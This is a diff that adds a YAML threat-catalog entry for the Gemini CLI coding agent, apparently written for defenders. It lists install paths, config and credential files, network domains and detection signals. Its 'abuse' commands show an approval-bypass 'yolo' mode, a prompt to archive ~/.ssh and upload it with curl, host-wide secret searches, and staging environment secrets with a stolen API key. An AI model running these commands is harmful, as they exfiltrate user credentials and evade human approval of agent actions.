@@ -1,0 +1,313 @@
+Name: Gemini CLI
+Id: gemini-cli
+Category: cli_agent
+Vendor: Google
+Description: Google's open-source Node.js CLI coding agent. Sets GEMINI_CLI=1 in subprocesses
+  (empirically observed). Config directory overridable via GEMINI_CLI_HOME per Gemini
+  CLI configuration reference.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - gemini
+  - gemini.exe
+  - gemini-cli
+  - gemini-cli.exe
+  Agentic: true
+  SpawnsShells: true
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities:
+  - Shell
+  - MCP
+  - Headless
+  Website: https://github.com/google-gemini/gemini-cli
+  CliExecutable: gemini
+  Framework: node_cli
+  HelperProcesses:
+  - node
+  InstallationPaths:
+  - ~/.gemini/
+  - '%USERPROFILE%\.gemini\'
+  ContextFiles:
+  - GEMINI.md
+  - .gemini/GEMINI.md
+  - ~/.gemini/GEMINI.md
+  ConfigDirs:
+    macOS: ~/.gemini/ (override GEMINI_CLI_HOME)
+    Linux: ~/.gemini/ (override GEMINI_CLI_HOME)
+    Windows: '%USERPROFILE%\.gemini\ (override GEMINI_CLI_HOME)'
+  Packages:
+    npm:
+    - '@google/gemini-cli'
+    winget:
+    - Google.GeminiCLI
+    brew:
+    - gemini-cli
+Commands:
+- Command: gemini
+  Description: Interactive Gemini CLI session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: gemini -p "summarize this file"
+  Description: One-shot Gemini prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: gemini --sandbox -p "run with sandbox enforced"
+  Description: gemini --sandbox enforces sandbox for session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: gemini mcp list
+  Description: List configured MCP servers
+  Category: MCP
+  Privileges: User
+  MitreID: T1106
+  Usage: normal
+  Platform: all
+- Command: gemini --acp
+  Description: Start Agent Client Protocol server exposing Gemini tools
+  Category: MCP
+  Privileges: User
+  MitreID: T1106
+  Usage: normal
+  Platform: all
+- Command: gemini --approval-mode yolo -p "edit files without approval prompts"
+  Description: gemini --approval-mode yolo auto-approves all tool actions
+  Category: Bypass
+  Privileges: User
+  MitreID: T1059
+  Usage: abuse
+  Platform: all
+- Command: gemini -y -p "run shell to tar ~/.ssh and curl upload"
+  Description: gemini -y (--yolo) shorthand auto-approves archive + outbound transfer
+  Category: Bypass
+  Privileges: User
+  MitreID: T1048
+  Usage: abuse
+  Platform: all
+- Command: gemini mcp add fs -- -- npx -y @modelcontextprotocol/server-filesystem
+    / $HOME
+  Description: gemini mcp add registers broad filesystem MCP server on host paths
+  Category: MCP
+  Privileges: User
+  MitreID: T1106
+  Usage: abuse
+  Platform: all
+- Command: gemini --include-directories /,$HOME --approval-mode yolo -p "search for
+    secrets outside repo"
+  Description: --include-directories expands workspace to host paths combined with
+    yolo approvals
+  Category: Bypass
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: 'GEMINI_API_KEY="$STOLEN" gemini -y -p "Summarize for staging: $(env |
+    grep -iE ''(key|token|secret|pass|cred)'' | head -25)"'
+  Description: Stolen GEMINI_API_KEY env with -y auto-approve for cloud-side staging
+  Category: Bypass
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: gemini-cli-attribution
+  Name: gemini attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.env.GEMINI_CLI
+    Value: '1'
+    Reliability: medium
+    Platform: all
+  FalsePositiveGuidance: Expected on hosts where this GenAI tool is installed. Corroborate
+    with path, signing, and network.
+Coverage:
+  Verified: true
+  Confidence: high
+  ReadinessGrade: B
+  LastVerified: '2026-07-18'
+  Source: catalog maintainer
+  EmpiricalNotes: Windows ARM64 empirically verified 2026-04-25, v0.39.1 via npm @google/gemini-cli.
+    Bundled node-pty winpty-agent.exe ARM64 prebuild present; main entrypoint is node.exe
+    + bundle/gemini.js (NotSigned). sh v1.8.3. Primary CLI or desktop binary empirically
+    present on lab PATH or documented install footprint (2026-07-19 revalidation).
+Artifacts:
+  Disk:
+  - Path: ~/.gemini/
+    Notes: override GEMINI_CLI_HOME
+    Platform: macOS
+  - Path: ~/.gemini/
+    Notes: override GEMINI_CLI_HOME
+    Platform: Linux
+  - Path: '%USERPROFILE%\.gemini\'
+    Notes: override GEMINI_CLI_HOME
+    Platform: Windows
+  Network:
+  - Domains:
+    - generativelanguage.googleapis.com
+    Description: Gemini API (primary)
+  - Domains:
+    - accounts.google.com
+    Description: OAuth authentication
+  - Domains:
+    - oauth2.googleapis.com
+    Description: OAuth token exchange
+  ConfigFiles:
+  - Path: GEMINI.md
+    Notes: Context/instructions file
+  - Path: .gemini/GEMINI.md
+    Notes: Context/instructions file
+  - Path: ~/.gemini/GEMINI.md
+    Notes: Context/instructions file
+  - Path: ~/.gemini/settings.json
+    Notes: MCP server configuration
+  - Path: .gemini/settings.json
+    Notes: MCP server configuration
+  Logs:
+  - Path: ~/.gemini/tmp/
+    Notes: Temporary session artifacts (docs-sourced)
+  Sessions:
+  - Path: ~/.gemini/tmp/
+    Notes: Active session scratch (docs-sourced)
+  AuthTokens:
+  - Path: ~/.gemini/oauth_creds.json
+    Notes: Google OAuth (docs-sourced; sensitive)
+  - Path: env GEMINI_API_KEY
+    Notes: API key via environment
+  Hooks:
+  - Path: ~/.gemini/settings.json
+    Notes: hooksConfig.hooks nested structure (official docs)
+  - Path: .gemini/settings.json
+    Notes: Project hooks block
+  Skills:
+  - Path: .gemini/skills/*/SKILL.md
+    Notes: Project skills
+  - Path: .agents/skills/*/SKILL.md
+    Notes: Alternate project skills path
+  - Path: .gemini/skills/<name>/SKILL.md
+    Notes: Skills (workspaceDir)
+  - Path: .agents/skills/<name>/SKILL.md
+    Notes: Skills (altWorkspaceDir)
+  MCP:
+  - Path: ~/.gemini/settings.json
+    Notes: mcpServers block in global settings
+  - Path: .gemini/settings.json
+    Notes: Project MCP servers
+  Environment:
+  - Path: env GEMINI_API_KEY
+    Notes: Google AI API key auth
+  - Path: env GEMINI_CLI_HOME
+    Notes: Override ~/.gemini/ config root
+  - Path: env GOOGLE_APPLICATION_CREDENTIALS
+    Notes: Vertex / GCP auth path
+Signing:
+  macOS:
+    Depth: none
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+    Notes: NotSigned wrapper (npm/node entrypoint)
+Resources:
+- Link: https://github.com/google-gemini/gemini-cli
+  Title: GitHub repository
+- Link: https://ai.google.dev/gemini-api/docs
+  Title: Gemini API documentation
+- Link: https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/settings.md
+  Title: CLI settings reference
+SearchAliases:
+- Google Gemini CLI
+- gemini cli
+Uuid: 1d31fbd4-00c7-5cf3-96ef-15991e13af6b
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: false
+  Windows: true
+  LastVerified: '2026-07-19'
+ExtensionIds:
+  vscode:
+  - google.gemini-cli-companion
+Integrations:
+  MCP:
+    Supported: true
+    Role: host
+    Transports:
+    - stdio
+    - sse
+    - streamable-http
+    ConfigPaths:
+    - ~/.gemini/settings.json
+    - .gemini/settings.json
+  Skills:
+    Supported: true
+    WorkspaceDirs:
+    - .gemini/skills/<name>/
+    SkillFile: SKILL.md
+  Hooks:
+    Supported: true
+    Events:
+    - SessionStart
+    - SessionEnd
+    - BeforeAgent
+    - AfterAgent
+    - BeforeModel
+    - AfterModel
+    - BeforeToolSelection
+    - BeforeTool
+    - AfterTool
+    - PreCompress
+    - Notification
+    ConfigPaths:
+      Project: .gemini/settings.json
+    Notes: Enabled by default since v0.37. Uses hooksConfig.hooks nested structure.
+DataProvenance:
+  SourceTypes:
+  - empirical
+  - official_doc
+  Notes: Windows ARM64 empirically verified 2026-04-25, v0.39.1 via npm @google/gemini-cli.
+    Bundled node-pty winpty-agent.exe ARM64 prebuild present; main entrypoint is node.exe
+    + bundle/gemini.js (NotSigned).
+UndocumentedEmpirical:
+- Label: GEMINI_CLI=1 in child env
+  Source: empirical
+  Notes: Empirical observation of CLI subprocess environment; not documented in official
+    config reference.
+PublicEcosystems:
+- Title: Gemini CLI Extensions
+  Url: https://www.geminicli.com/extensions/
+  Category: extension_gallery
+  Operator: Google
+  Description: 726+ extensions as of April 2026. Browsable at geminicli.com/extensions
+    (ranked by stars). Extension settings system (Feb 2026) for automated config (API
+    keys, URLs) with keychain storage. Launch partners include Elastic, Figma, Shopify,
+    Stripe, Snyk.
+  Official: true
+  Public: true
+  OpenSubmission: true
+  Installable: true
+  CanExecuteCode: true
+  CanInstallRemoteCode: true
+  SurfaceScope:
+  - gemini_cli
+  InstallSurfaces:
+  - cli
+  PackagesCanInclude:
+  - extensions
+  - skills
+  SourceRepo: https://github.com/gemini-cli-extensions
